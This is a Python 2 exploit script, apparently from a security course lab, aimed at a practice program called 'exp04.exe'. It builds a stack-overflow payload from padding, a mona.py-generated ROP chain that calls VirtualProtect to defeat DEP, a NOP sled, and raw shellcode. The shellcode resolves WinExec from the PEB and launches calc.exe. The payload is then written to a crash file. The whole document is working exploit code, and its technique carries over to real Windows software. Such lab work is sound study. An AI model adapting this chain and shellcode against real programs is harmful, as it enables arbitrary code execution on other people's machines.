# -*- coding: utf-8 -*-
import struct

def create_rop_chain():
    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
    #[---INFO:gadgets_to_set_esi:---]
   #[---INFO:gadgets_to_set_esi:---]
      0x00dd4499,  # POP ECX # RETN [（实验四）exp04.exe] 
      0x90909090,  # nop
      0x90909090,  # nop
      0x00f00688,  # ptr to &VirtualProtect() [IAT （实验四）exp04.exe]
      0x00dc7799,  # MOV EAX,DWORD PTR DS:[ECX] # RETN [（实验四）exp04.exe] 
      0x00b18030,  # XCHG EAX,ESI # RETN [（实验四）exp04.exe] 
      #[---INFO:gadgets_to_set_ebp:---]
      0x00831501,  # POP EBP # RETN [（实验四）exp04.exe] 
      0x008f8d62,  # & jmp esp [（实验四）exp04.exe]
      #[---INFO:gadgets_to_set_ebx:---]
      0x00d3523e,  # POP EBX # RETN [（实验四）exp04.exe] 
      0x00000201,  # 0x00000201-> ebx
      #[---INFO:gadgets_to_set_edx:---]
      0x00b13264,  # POP EDX # RETN [（实验四）exp04.exe] 
      0x00000040,  # 0x00000040-> edx
      #[---INFO:gadgets_to_set_ecx:---]
      0x00b2919e,  # POP ECX # RETN [（实验四）exp04.exe] 
      0x004b2d94,  # &Writable location [（实验四）exp04.exe]
      #[---INFO:gadgets_to_set_edi:---]
      0x00d21057,  # POP EDI # RETN [（实验四）exp04.exe] 
      0x00b13e04,  # RETN (ROP NOP) [（实验四）exp04.exe]
      #[---INFO:gadgets_to_set_eax:---]
      0x00c35801,  # POP EAX # RETN [（实验四）exp04.exe] 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x00b12d5c,  # PUSHAD # RETN [（实验四）exp04.exe] 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
exploit = ""
 
junk = "A"*72

rop_chain = create_rop_chain() 
# eip = little_endian(0x0089a861)
 
nops = "\x90"*20

shellcode = ""
shellcode +="\x55\x8B\xEC\x83\xEC\x20\x64\xA1\x30\x00\x00\x00\x8B\x40"
shellcode +="\x0C\x8B\x40\x1C\x8B\x00\x8B\x00\x8B\x40\x08\xC7\x45\xFC"
shellcode +="\x00\x00\x00\x00\xC7\x45\xF8\x00\x00\x00\x00\xC7\x45\xF4"
shellcode +="\x00\x00\x00\x00\x8B\x58\x3C\x8D\x1C\x18\x8B\x5B\x78\x8D"
shellcode +="\x14\x18\x8B\x5A\x1C\x8D\x1C\x18\x89\x5D\xFC\x8B\x5A\x20"
shellcode +="\x8D\x1C\x18\x89\x5D\xF8\x8B\x5A\x24\x8D\x1C\x18\x89\x5D"
shellcode +="\xF4\x8B\x7A\x18\x33\xC9\x8B\x75\xF8\x8B\x1C\x8E\x8D\x1C"
shellcode +="\x18\x8B\x1B\x81\xFB\x57\x69\x6E\x45\x74\x03\x41\xEB\xED"
shellcode +="\x8B\x5D\xF4\x33\xD2\x66\x8B\x14\x4B\x8B\x5D\xFC\x8B\x1C"
shellcode +="\x93\x8D\x04\x18\xEB\x09\x63\x61\x6C\x63\x2E\x65\x78\x65"
shellcode +="\x00\xE8\x00\x00\x00\x00\x5B\x83\xEB\x0E\x6A\x05\x53\xFF"
shellcode +="\xD0\x8B\xE5\x5D\xC3"



exploit = junk + rop_chain + nops  + shellcode




try:
    rst= open("D:\python\crash.txt","w")
    rst.write(exploit)
    rst.close()
    print "OK"
except:
    print "Error"
